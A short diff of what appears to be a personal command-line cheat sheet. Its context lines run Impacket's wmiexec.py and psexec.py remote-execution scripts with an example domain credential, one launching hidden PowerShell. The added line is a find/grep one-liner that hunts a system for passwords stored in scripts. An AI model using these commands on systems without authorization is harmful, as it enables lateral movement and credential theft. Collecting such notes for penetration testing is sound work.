@@ -204,6 +204,7 @@ python examples/wmiexec.py 192.168.1.1 DOMAIN/user:P@ssw0rd
 python examples/psexec.py -target-ip 192.168.1.2 DOMAIN/user:P@ssw0rd net use
 python examples/psexec.py -target-ip 192.168.1.2 DOMAIN/user:P@ssw0rd "powershell.exe -w hidden" # Rest of attack string goes here
 
+find . -type f -exec grep -i -I password {} /dev/null \;  # Hunt a system for passwords stored in scripts
 
 
 # Most below here are probably from https://twitter.com/climagic
